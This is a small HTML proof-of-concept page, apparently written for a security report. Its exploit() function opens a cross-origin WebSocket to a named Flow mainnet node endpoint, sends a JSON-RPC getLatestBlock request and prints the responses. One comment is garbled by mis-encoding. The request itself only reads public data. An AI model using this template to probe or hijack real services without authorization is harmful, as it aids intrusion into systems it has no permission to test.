<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WebSocket CORS PoC</title>
</head>
<body>
  <h2>WebSocket CORS PoC</h2>
  <button onclick="exploit()">Open WS & Send Request</button>
  <pre id="output"></pre>

  <script>
    function log(msg) {
      document.getElementById("output").textContent += msg + "\n";
    }

    function exploit() {
      const ws = new WebSocket("wss://access.mainnet.nodes.flow.com/v1/ws");

      ws.onopen = function() {
        log("OPEN: connection established");

        // ðŸ“Œ Ù…Ø«Ø§Ù„: Ø·Ù„Ø¨ getLatestBlock (RPC request)
        const msg = {
          jsonrpc: "2.0",
          id: 1,
          method: "getLatestBlock",
          params: [{ "is_sealed": true }]
        };

        ws.send(JSON.stringify(msg));
        log("SENT: " + JSON.stringify(msg));
      };

      ws.onmessage = function(event) {
        log("RECEIVED: " + event.data);
      };

      ws.onerror = function(err) {
        log("ERROR: " + err);
      };

      ws.onclose = function() {
        log("CLOSED: connection closed");
      };
    }
  </script>
</body>
</html>
